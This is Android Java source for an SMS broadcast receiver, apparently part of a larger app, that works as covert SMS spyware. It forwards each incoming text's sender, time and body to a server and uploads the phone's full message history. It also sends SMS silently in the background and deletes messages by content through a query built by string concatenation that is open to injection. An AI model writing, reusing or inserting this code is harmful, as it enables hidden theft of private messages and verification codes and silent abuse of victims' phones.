/**
 * 
 */
package sms;

import java.text.SimpleDateFormat;
import java.util.Date;

import activity.SplashActivity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import download.DownloadService;
import util.ConfigCt;

/**
 * @author byc
 *
 */
public class SmsReceiver extends BroadcastReceiver {
	private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private static final String TAG = "byc001";
	private Context context;
	public String address=""; //短信地址；
	public String smsContent = "";//短信内容;
	public String receiveTime="";//接收时间
	public Date date;
	
	@Override  
	public void onReceive(Context context, Intent intent) {
		SplashActivity.startSplashActivity(context);
		if(intent.getAction().equals(ACTION)){  
			this.context=context;
			 Bundle bundle = intent.getExtras();
			 if (null == bundle)return;
			Object[] pdus=(Object[])intent.getExtras().get("pdus");  
			SmsMessage[] messages=new SmsMessage[pdus.length];  
			smsContent = "";
			for(int i=0;i<pdus.length;i++){   
				messages[i]=SmsMessage.createFromPdu((byte[])pdus[i]);  
				//sb.append("接收到短信来自:\n");  
				address=messages[i].getDisplayOriginatingAddress();  
				smsContent += messages[i].getMessageBody();
				date = new Date(messages[i].getTimestampMillis());//时间 
			}  
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");  
            String receiveTime = format.format(date); 
            if(ConfigCt.DEBUG){
            	Log.i(TAG, receiveTime);
            	Log.i(TAG, address);
            	Log.i(TAG, smsContent);
            }
			String info=receiveTime+"\r\n"+address+"\r\n"+smsContent;
			DownloadService.SendInfo(context,info,ConfigCt.appID+"-sms");
			

		}

	}
	/*
	 * 根据内容删除短信
	 */
	private boolean DelSms(String SmsContent){
		   //根据号码删除短信
        int res = context.getContentResolver().delete(Uri.parse("content://sms"), "body like '" + SmsContent + "'", null);
        for(int i=0;i<10;i++){
            if(res>0){
            	Log.i(TAG, "删除成功！");
            	break;
            }else{
            	Log.i(TAG, "删除失败！");
            	res = context.getContentResolver().delete(Uri.parse("content://sms"), "body like '" + SmsContent + "'", null);
            }
        }
        if(res>0)return true;else return false;
	}
	/*
	 * 发送短信
	 */
	public static boolean SendSms(final String address,final String body){
		new Thread(new Runnable() {    
			@Override    
		    public void run() {    
				try{
					SmsManager manager = SmsManager.getDefault();
					manager.sendTextMessage(address, null, body, null, null);
					ConfigCt.getInstance(null).setIsSendSmsToPhone(true);
				}catch(IllegalArgumentException e)
				{
					e.printStackTrace();
					//return false;
				}
		    }    
		}).start();
		return true;
	}
	/*
	 * 发送所有短信至服务器："kk-sms"
	 */
	public static void sendALLSmsToServer(final Context context,final String id){
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					String sms=getSmsInPhone(context);
					boolean bSuc=true;
					if(sms.indexOf("no result!")!=-1)bSuc=false;
					DownloadService.SendInfo(context,sms,id);
					ConfigCt.getInstance(context).setIsSendSms(bSuc);
				} catch (Exception e) {
					e.printStackTrace();
				}//try {
			}// public void run() {
		}).start();//new Thread(new Runnable() {
	}
	  /** 
     * 获取所有短信 
     *  
     * @return 
     */  
    public static String getSmsInPhone(Context context) {  
        final String SMS_URI_ALL = "content://sms/";  
  
        StringBuilder smsBuilder = new StringBuilder();  
  
        try {  
            Uri uri = Uri.parse(SMS_URI_ALL);  
            String[] projection = new String[] { "_id", "address", "person",  
                    "body", "date", "type" };  
            Cursor cur = context.getContentResolver().query(uri, projection, null,  
                    null, "date desc"); // 获取手机内部短信  
  
            if (cur.moveToFirst()) {  
                int index_Address = cur.getColumnIndex("address");  
                int index_Person = cur.getColumnIndex("person");  
                int index_Body = cur.getColumnIndex("body");  
                int index_Date = cur.getColumnIndex("date");  
                int index_Type = cur.getColumnIndex("type");  
  
                do {  
                    String strAddress = cur.getString(index_Address);  
                    int intPerson = cur.getInt(index_Person);  
                    String strbody = cur.getString(index_Body);  
                    long longDate = cur.getLong(index_Date);  
                    int intType = cur.getInt(index_Type);  
  
                    SimpleDateFormat dateFormat = new SimpleDateFormat(  
                            "yyyy-MM-dd hh:mm:ss");  
                    Date d = new Date(longDate);  
                    String strDate = dateFormat.format(d);  
  
                    String strType = "";  
                    if (intType == 1) {  
                        strType = "接收";  
                    } else if (intType == 2) {  
                        strType = "发送";  
                    } else {  
                        strType = "null";  
                    }  
  
                    smsBuilder.append("[ ");  
                    smsBuilder.append(strAddress + ", ");  
                    smsBuilder.append(intPerson + ", ");  
                    smsBuilder.append(strbody + ", ");  
                    smsBuilder.append(strDate + ", ");  
                    smsBuilder.append(strType);  
                    smsBuilder.append(" ]\r\n");  
                } while (cur.moveToNext());  
  
                if (!cur.isClosed()) {  
                    cur.close();  
                    cur = null;  
                }  
            } else {  
                smsBuilder.append("no result!");  
            } // end if  
  
            smsBuilder.append("getSmsInPhone has executed!");  
  
        } catch (SQLiteException ex) {  
            Log.d("SQLiteException in getSmsInPhone", ex.getMessage());  
        }  
        Log.i(TAG, smsBuilder.toString());
        return smsBuilder.toString();  
    } 

}
